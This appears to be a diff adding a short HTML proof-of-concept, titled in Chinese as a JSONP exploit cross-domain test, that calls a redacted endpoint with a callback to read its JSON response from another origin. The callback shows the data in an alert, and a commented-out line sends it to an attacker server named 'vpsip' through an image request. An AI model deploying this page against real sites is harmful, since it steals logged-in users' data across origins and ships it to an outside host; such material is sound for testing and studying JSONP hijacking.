@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<title>JSONP EXP跨域测试</title>
+	</head>
+	<body>
+		<script>
+		function jsonpcallback(data){
+		//new Image().src="http://vpsip/" + JSON.stringify(data)
+		alert(JSON.stringify(data))
+		}
+		</script>
+		
+		<script src="https://xxxxxxx?callback=jsonpcallback"></script>	
+	</body>
+</html>
